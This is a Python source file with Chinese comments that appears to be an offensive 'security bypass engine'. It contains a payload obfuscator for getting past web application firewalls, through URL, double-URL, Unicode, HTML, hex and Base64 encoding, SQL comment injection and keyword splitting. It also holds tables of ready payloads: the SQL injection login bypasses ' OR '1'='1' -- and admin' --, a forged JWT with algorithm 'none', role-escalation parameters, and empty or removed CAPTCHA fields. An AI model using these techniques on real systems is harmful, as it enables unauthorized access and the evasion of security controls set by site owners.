"""
security/security_bypass_engine.py - 安全验证绕过引擎

核心能力：
- SecurityBypassEngine: 统一安全验证绕过引擎
  - WAF绕过（编码绕过/参数污染/分块传输/协议层绕过）
  - 认证绕过（SQL注入认证/JWT伪造/会话固定/权限提升）
  - 验证码绕过（重放/空值/绕过检查/机器学习识别）
  - 速率限制绕过（IP轮换/请求分散/慢攻击/缓存投毒）
  - 403/401绕过（路径遍历/Header注入/方法替换）
- PayloadObfuscator: Payload混淆器
  - 多种编码（URL/Unicode/HTML/Base64/Hex）
  - 字符串拆分与拼接
  - 注释注入
  - 大小写混淆
- BypassTester: 绕过测试器
  - 自动测试多种绕过技术
  - 成功率统计
  - 最优绕过方案推荐
"""
import os
import re
import sys
import json
import time
import uuid
import random
import hashlib
import base64
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from collections import defaultdict, Counter
from enum import Enum

class BypassType(Enum):
    """绕过类型"""
    WAF = "waf"
    AUTH = "auth"
    CAPTCHA = "captcha"
    RATE_LIMIT = "rate_limit"
    FORBIDDEN = "forbidden"  # 403/401

@dataclass
class BypassTechnique:
    """绕过技术"""
    technique_id: str = ""
    bypass_type: str = ""
    name: str = ""
    description: str = ""
    payload_template: str = ""
    success_indicators: List[str] = field(default_factory=list)
    failure_indicators: List[str] = field(default_factory=list)
    success_rate: float = 0.0
    tested_count: int = 0
    success_count: int = 0
    risk_level: str = "medium"
    notes: str = ""

    def __post_init__(self):
        if not self.technique_id:
            self.technique_id = f"bypass_{uuid.uuid4().hex[:8]}"

    def to_dict(self) -> Dict:
        return {
            "technique_id": self.technique_id,
            "bypass_type": self.bypass_type,
            "name": self.name,
            "description": self.description,
            "success_rate": round(self.success_rate, 2),
            "tested_count": self.tested_count,
            "success_count": self.success_count,
            "risk_level": self.risk_level,
        }

@dataclass
class BypassResult:
    """绕过测试结果"""
    result_id: str = ""
    target_url: str = ""
    bypass_type: str = ""
    technique_name: str = ""
    success: bool = False
    status_code: int = 0
    response_time: float = 0.0
    response_preview: str = ""
    payload_used: str = ""
    evidence: List[str] = field(default_factory=list)
    notes: str = ""
    tested_at: float = 0.0

    def __post_init__(self):
        if not self.result_id:
            self.result_id = f"bypass_result_{uuid.uuid4().hex[:8]}"
        if not self.tested_at:
            self.tested_at = time.time()

    def to_dict(self) -> Dict:
        return {
            "result_id": self.result_id,
            "target_url": self.target_url,
            "bypass_type": self.bypass_type,
            "technique_name": self.technique_name,
            "success": self.success,
            "status_code": self.status_code,
            "response_time": round(self.response_time, 3),
            "payload_used": self.payload_used[:200] if self.payload_used else "",
            "evidence": self.evidence[:10],
            "notes": self.notes,
        }

class PayloadObfuscator:
    """Payload混淆器

    多种编码和混淆技术，用于绕过WAF检测。
    """

    def url_encode(self, payload: str) -> str:
        """URL编码"""
        return urllib.parse.quote(payload, safe='')

    def double_url_encode(self, payload: str) -> str:
        """双重URL编码"""
        return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')

    def unicode_encode(self, payload: str) -> str:
        """Unicode编码"""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)

    def html_encode(self, payload: str) -> str:
        """HTML实体编码"""
        return ''.join(f'&#{ord(c)};' for c in payload)

    def base64_encode(self, payload: str) -> str:
        """Base64编码"""
        return base64.b64encode(payload.encode()).decode()

    def hex_encode(self, payload: str) -> str:
        """Hex编码"""
        return payload.encode().hex()

    def case_obfuscate(self, payload: str) -> str:
        """大小写混淆"""
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)

    def comment_inject(self, payload: str) -> str:
        """注释注入（SQL）"""
        return payload.replace(" ", "/**/")

    def string_concat(self, payload: str) -> str:
        """字符串拆分拼接（SQL）"""
        if "SELECT" in payload.upper():
            return payload.replace("SELECT", "SEL/**/ECT")
        if "UNION" in payload.upper():
            return payload.replace("UNION", "UN/**/ION")
        return payload

    def null_byte_inject(self, payload: str) -> str:
        """空字节注入"""
        return payload.replace(" ", "%00")

    def encoding_switch(self, payload: str) -> str:
        """混合编码切换"""
        techniques = [
            self.url_encode,
            self.double_url_encode,
            self.unicode_encode,
            self.html_encode,
            self.case_obfuscate,
            self.comment_inject,
        ]
        return random.choice(techniques)(payload)

    def generate_all_variants(self, payload: str) -> List[Dict]:
        """生成所有混淆变体"""
        variants = []
        techniques = [
            ("original", lambda p: p),
            ("url_encode", self.url_encode),
            ("double_url_encode", self.double_url_encode),
            ("unicode_encode", self.unicode_encode),
            ("html_encode", self.html_encode),
            ("base64_encode", self.base64_encode),
            ("hex_encode", self.hex_encode),
            ("case_obfuscate", self.case_obfuscate),
            ("comment_inject", self.comment_inject),
            ("string_concat", self.string_concat),
        ]
        for name, func in techniques:
            try:
                result = func(payload)
                variants.append({"technique": name, "payload": result})
            except Exception:
                pass
        return variants

WAF_BYPASS_TECHNIQUES = [
    {
        "name": "URL编码绕过",
        "description": "对Payload进行URL编码绕过WAF特征匹配",
        "payload_func": "url_encode",
        "success_indicators": ["200", "sql", "error", "root"],
    },
    {
        "name": "双重URL编码绕过",
        "description": "双重URL编码，WAF只解码一次",
        "payload_func": "double_url_encode",
        "success_indicators": ["200", "sql", "error"],
    },
    {
        "name": "注释注入绕过",
        "description": "在SQL关键字中插入/**/注释",
        "payload_func": "comment_inject",
        "success_indicators": ["200", "sql", "error"],
    },
    {
        "name": "大小写混淆绕过",
        "description": "随机大小写绕过大小写敏感的WAF规则",
        "payload_func": "case_obfuscate",
        "success_indicators": ["200", "sql", "error"],
    },
    {
        "name": "参数污染绕过",
        "description": "HTTP参数污染（HPP），重复参数绕过WAF",
        "payload_template": "?id=1&id={payload}&id=3",
        "success_indicators": ["200", "sql", "error"],
    },
    {
        "name": "分块传输绕过",
        "description": "使用Transfer-Encoding: chunked分块传输Payload",
        "payload_template": "chunked",
        "success_indicators": ["200", "sql", "error"],
    },
    {
        "name": "HTTP/2绕过",
        "description": "使用HTTP/2协议绕过基于HTTP/1.1的WAF",
        "payload_template": "http2",
        "success_indicators": ["200", "sql", "error"],
    },
    {
        "name": "路径混淆绕过",
        "description": "在URL路径中插入./或//混淆",
        "payload_template": "/./{path}/../{path}",
        "success_indicators": ["200", "sql", "error"],
    },
]

AUTH_BYPASS_TECHNIQUES = [
    {
        "name": "SQL注入认证绕过",
        "description": "在登录表单使用' OR '1'='1绕过认证",
        "payload": "' OR '1'='1' --",
        "success_indicators": ["welcome", "dashboard", "admin", "logout"],
    },
    {
        "name": "万能密码绕过",
        "description": "使用admin' --作为用户名绕过密码验证",
        "payload": "admin' --",
        "success_indicators": ["welcome", "dashboard", "admin"],
    },
    {
        "name": "JWT none算法绕过",
        "description": "将JWT alg改为none，签名留空",
        "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.",
        "success_indicators": ["200", "admin", "authorized"],
    },
    {
        "name": "会话固定绕过",
        "description": "使用已知会话ID固定会话",
        "payload": "sessionid=fixed_session_id",
        "success_indicators": ["200", "authorized"],
    },
    {
        "name": "权限提升绕过",
        "description": "修改用户ID或角色参数提升权限",
        "payload": "user_id=1&role=admin",
        "success_indicators": ["admin", "root", "superuser"],
    },
    {
        "name": "空密码绕过",
        "description": "提交空密码绕过非空验证",
        "payload": "password=",
        "success_indicators": ["welcome", "dashboard"],
    },
]

CAPTCHA_BYPASS_TECHNIQUES = [
    {
        "name": "验证码重放绕过",
        "description": "重复使用已验证的验证码",
        "payload": "captcha=previous_valid_code",
        "success_indicators": ["200", "success"],
    },
    {
        "name": "空验证码绕过",
        "description": "提交空验证码字段",
        "payload": "captcha=",
        "success_indicators": ["200", "success"],
    },
    {
        "name": "移除验证码字段绕过",
        "description": "完全移除验证码参数",
        "payload": "remove_captcha_param",
        "success_indicators": ["200", "success"],
    },
    {
        "name": "验证码类型混淆绕过",
        "description": "修改验证码类型参数",
        "payload": "captcha_type=none",
        "success_indicators": ["200", "success"],
    },
    {
        "name": "OCR识别绕过",
        "description": "使用OCR自动识别简单验证码",
        "payload": "ocr_recognition",
        "success_indicators": ["200", "success"],
    },
]
